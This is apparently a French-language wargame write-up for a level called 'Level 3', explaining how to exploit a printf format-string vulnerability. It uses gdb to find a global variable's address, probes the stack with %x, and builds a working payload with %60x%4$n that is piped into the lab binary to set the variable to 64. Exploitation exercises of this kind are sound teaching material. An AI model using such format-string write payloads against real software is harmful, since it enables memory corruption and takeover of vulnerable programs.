# Level 3

Utiliser la vulnerabilite de printf

## Notion

**%n** ecrit le nombre de caractere dans l'argument


## Logique de l'exercice

### analyse du code

On a une variable globale "m" a laquelle on doit lui donner la valeur 64. Pour ca on peut rentrer un input qui est directement mis dans printf.

### trouver l'adresse de m

```bash

(gdb) run
Starting program: /home/user/level3/level3 
^C
Program received signal SIGINT, Interrupt.
0xb7fdd428 in __kernel_vsyscall ()
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x804988c

```
0x804988c -> \x8c\x98\x04\x08

### trouver l'emplacement de notre chaine

```shell
./level3 
AAAA %x %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520
```
On a "AAAA" en 4e position

### construire la commande

-On met l'adresse qui sera notre 4e argument pour printf 

        \x8c\x98\x04\x08
-Ensuite on ajoute 64 - 4 = 60 char pour que %n compte 64 char

        \x8c\x98\x04\x08%60x

-On rajoute le %n qui va assigner au  4e arguments  

        \x8c\x98\x04\x08%60x%4$n

-Pour finir on rajoute le python le cat pour le terminal et notre executable 
 
        (python -c 'print("\x8c\x98\x04\x08%60x%4$n")'; cat) | ./level3

## Sources

- ChatGPT
- www.cert-ist.com/public/fr/SO_detail?code=Vuln_Format_String
- https://www.geeksforgeeks.org/c/g-fact-31/

